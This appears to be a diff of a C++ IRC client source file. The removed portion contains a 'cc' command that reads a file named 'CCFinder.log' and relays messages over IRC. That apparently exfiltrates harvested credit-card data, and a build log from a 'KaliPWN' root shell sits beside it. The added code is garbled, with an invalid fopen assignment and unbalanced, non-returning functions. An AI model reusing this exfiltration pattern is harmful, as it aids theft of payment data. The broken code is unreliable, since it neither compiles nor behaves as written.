@@ -14,226 +14,159 @@
  */
 
 #include <iostream>
-#include <signal.h>
-#include <cstdlib>
-#include <map>
 #include <algorithm>
-#include "Thread.h"
+#include "IRCSocket.h"
 #include "IRCClient.h"
+#include "IRCHandler.h"
+#include <string>
+using namespace std;
+int sockfd; 
+int nsockfd;
 
-volatile bool running;
-
-void signalHandler(int signal)
+bool IRCClient::InitSocket()
 {
-    running = false;
+    return _socket.Init();
 }
 
-class ConsoleCommandHandler
+bool IRCClient::Connect(char* host, int port)
 {
-public:
-    bool AddCommand(std::string name, int argCount, void (*handler)(std::string /*params*/, IRCClient* /*client*/))
+    return _socket.Connect(host, port);
+}
+
+void IRCClient::Disconnect()
+{
+    _socket.Disconnect();
+}
+
+bool IRCClient::SendIRC(std::string data)
+{
+    data.append("\n");
+    return _socket.SendData(data.c_str());
+}
+
+bool IRCClient::Login(std::string nick, std::string user, std::string password)
+{
+    _nick = nick;
+    _user = user;
+        string(input) = fopen("Hello.txt", "rb");
+    if (SendIRC("HELLO"))
     {
-        CommandEntry entry;
-        entry.argCount = argCount;
-        entry.handler = handler;
-        std::transform(name.begin(), name.end(), name.begin(), towlower);
-        _commands.insert(std::pair<std::string, CommandEntry>(name, entry));
-        return true;
+        if (!password.empty() && !SendIRC("PASS "+password))
+            return false;
+        if (SendIRC("NICK " + nick))
+            if (SendIRC("USER " + user + " 8 * :Cpp IRC Client")) {
+
+    }
+}
+}
+void IRCClient::ReceiveData()
+{
+    std::string buffer = _socket.ReceiveData();
+
+    std::string line;
+    std::istringstream iss(buffer);
+    while(getline(iss, line))
+    {
+        if (line.find("\r") != std::string::npos)
+            line = line.substr(0, line.size() - 1);
+        Parse(line);
+    }
+}
+
+void IRCClient::Parse(std::string data)
+{
+    std::string original(data);
+    IRCCommandPrefix cmdPrefix;
+
+    // if command has prefix
+    if (data.substr(0, 1) == ":")
+    {
+        cmdPrefix.Parse(data);
+        data = data.substr(data.find(" ") + 1);
     }
 
-    void ParseCommand(std::string command, IRCClient* client)
-    {
-        if (_commands.empty())
-        {
-            std::cout << "No commands available." << std::endl;
-            return;
-        }
-
-        if (command[0] == '/')
-            command = command.substr(1); // Remove the slash
-
-        std::string name = command.substr(0, command.find(" "));
-        std::string args = command.substr(command.find(" ") + 1);
-        int argCount = std::count(args.begin(), args.end(), ' ');
-
-        std::transform(name.begin(), name.end(), name.begin(), towlower);
-
-        std::map<std::string, CommandEntry>::const_iterator itr = _commands.find(name);
-        if (itr == _commands.end())
-        {
-            std::cout << "Command not found." << std::endl;
-            return;
-        }
-
-        if (++argCount < itr->second.argCount)
-        {
-            std::cout << "Insuficient arguments." << std::endl;
-            return;
-        }
-
-        (*(itr->second.handler))(args, client);
-    }
-
-private:
-    struct CommandEntry
-    {
-        int argCount;
-        void (*handler)(std::string /*arguments*/, IRCClient* /*client*/);
-    };
-
-    std::map<std::string, CommandEntry> _commands;
-};
-
-ConsoleCommandHandler commandHandler;
-void ccCommand(std::string arguments, IRCClient* client)
-{
-    std::string to = arguments.substr(0, arguments.find(" "));
-    std::string text = arguments.substr(arguments.find(" ") + 1);
-
-    std::cout << "To " + to + ": " + text << std::endl;
-    
-                char buffer[256];
-FILE *fd = fopen("CCFinder.log", "rb");
-int bytes_read;
-while (!feof(fd)) {
-    if ((bytes_read = fread(&buffer, 1, 256, fd)) > 0) {
-        std::string msg(buffer, bytes_read, 0);
-        client->SendIRC("PRIVMSG " + to + ": " + text);
-       }
+    std::string command = data.substr(0, data.find(" "));
+    std::transform(command.begin(), command.end(), command.begin(), towupper);
+    if (data.find(" ") != std::string::npos)
+        data = data.substr(data.find(" ") + 1);
     else
-        break;
-}
-    fclose(fd);
-};
-void msgCommand(std::string arguments, IRCClient* client)
-{
-    std::string to = arguments.substr(0, arguments.find(" "));
-    std::string text = arguments.substr(arguments.find(" ") + 1);
+        data = "";
 
-    std::cout << "To " + to + ": " + text << std::endl;
-    client->SendIRC("PRIVMSG " + to + " :" + text);
-};
+    std::vector<std::string> parameters;
 
-void joinCommand(std::string channel, IRCClient* client)
-{
-    if (channel[0] != '#')
-        channel = "#" + channel;
-
-    client->SendIRC("JOIN " + channel);
-}
-
-
-
-void partCommand(std::string channel, IRCClient* client)
-{
-    if (channel[0] != '#')
-        channel = "#" + channel;
-
-    client->SendIRC("PART " + channel);
-}
-
-void ctcpCommand(std::string arguments, IRCClient* client)
-{
-    std::string to = arguments.substr(0, arguments.find(" "));
-    std::string text = arguments.substr(arguments.find(" ") + 1);
-
-    std::transform(text.begin(), text.end(), text.begin(), towupper);
-
-    client->SendIRC("PRIVMSG " + to + " :\001" + text + "\001");
-}
-
-ThreadReturn inputThread(void* client)
-{
-    std::string command;
-
-    commandHandler.AddCommand("msg", 2, &msgCommand);
-    commandHandler.AddCommand("join", 1, &joinCommand);
-    commandHandler.AddCommand("cc", 2, &ccCommand);
-    commandHandler.AddCommand("part", 1, &partCommand);
-    commandHandler.AddCommand("ctcp", 2, &ctcpCommand);
-
-    while(true)
+    if (data != "")
     {
-        getline(std::cin, command);
-        if (command == "")
-            continue;
-
-        if (command[0] == '/')
-            commandHandler.ParseCommand(command, (IRCClient*)client);
+        if (data.substr(0, 1) == ":")
+            parameters.push_back(data.substr(1));
         else
-            ((IRCClient*)client)->SendIRC(command);
-
-        if (command == "quit")
-            break;
+        {
+            size_t pos1 = 0, pos2;
+            while ((pos2 = data.find(" ", pos1)) != std::string::npos)
+            {
+                parameters.push_back(data.substr(pos1, pos2 - pos1));
+                pos1 = pos2 + 1;
+                if (data.substr(pos1, 1) == ":")
+                {
+                    parameters.push_back(data.substr(pos1 + 1));
+                    break;
+                }
+            }
+            if (parameters.empty())
+                parameters.push_back(data);
+        }
     }
 
-#ifdef _WIN32
-    _endthread();
-#else
-    pthread_exit(NULL);
-#endif
+    if (command == "ERROR")
+    {
+        std::cout << original << std::endl;
+        Disconnect();
+        return;
+    }
+
+    if (command == "PING")
+    {
+        std::cout << "Ping? Pong!" << std::endl;
+        SendIRC("PONG :" + parameters.at(0));
+        return;
+    }
+
+    IRCMessage ircMessage(command, cmdPrefix, parameters);
+
+    // Default handler
+    int commandIndex = GetCommandHandler(command);
+    if (commandIndex < NUM_IRC_CMDS)
+    {
+        IRCCommandHandler& cmdHandler = ircCommandTable[commandIndex];
+        (this->*cmdHandler.handler)(ircMessage);
+    }
+    else if (_debug)
+        std::cout << original << std::endl;
+
+    // Try to call hook (if any matches)
+    CallHook(command, ircMessage);
 }
 
-int main(int argc, char* argv[])
+void IRCClient::HookIRCCommand(std::string command, void (*function)(IRCMessage /*message*/, IRCClient* /*client*/))
 {
-    if (argc < 3)
+    IRCCommandHook hook;
+
+    hook.command = command;
+    hook.function = function;
+
+    _hooks.push_back(hook);
+}
+
+void IRCClient::CallHook(std::string command, IRCMessage message)
+{
+    if (_hooks.empty())
+        return;
+
+    for (std::list<IRCCommandHook>::const_iterator itr = _hooks.begin(); itr != _hooks.end(); ++itr)
     {
-        std::cout << "Insuficient parameters: host port [nick] [user]" << std::endl;
-        return 1;
-    }
-
-    char* host = argv[1];
-    int port = atoi(argv[2]);
-    std::string nick("MyIRCClient");
-    std::string user("IRCClient");
-
-    if (argc >= 4)
-        nick = argv[3];
-    if (argc >= 5)
-        user = argv[4];
-
-    IRCClient client;
-
-    client.Debug(true);
-
-    // Start the input thread
-    Thread thread;
-    thread.Start(&inputThread, &client);
-
-    if (client.InitSocket())
-    {
-        std::cout << "Socket initialized. Connecting..." << std::endl;
-
-        if (client.Connect(host, port))
+        if (itr->command == command)
         {
-            std::cout << "Connected. Loggin in..." << std::endl;
-
-            if (client.Login(nick, user))
-            {
-                std::cout << "Logged." << std::endl;
-
-                running = true;
-                signal(SIGINT, signalHandler);
-
-                while (client.Connected() && running)
-                    client.ReceiveData();
-            }
-
-
-            if (client.Connected())
-                client.Disconnect();
-
-            std::cout << "Disconnected." << std::endl;
+            (*(itr->function))(message, this);
+            break;
         }
     }
 }
-
-/*root@KaliPWN:~/Desktop/IRCClient# make
-g++ -c -Wall src/Main.cpp -o src/Main.o
-g++ -o ircclient src/IRCClient.o src/Thread.o src/IRCHandler.o src/IRCSocket.o src/Main.o -lpthread
-/usr/bin/ld: src/IRCClient.o: in function `IRCCommandPrefix::Parse(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >)':
-IRCClient.cpp:(.text._ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE[_ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE]+0xe4): undefined reference to `split(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, char)'
-/usr/bin/ld: IRCClient.cpp:(.text._ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE[_ZN16IRCCommandPrefix5ParseENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE]+0x1d6): undefined reference to `split(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, char)'
-collect2: error: ld returned 1 exit status
-make: *** [Makefile:13: ircclient] Error 1
-*/
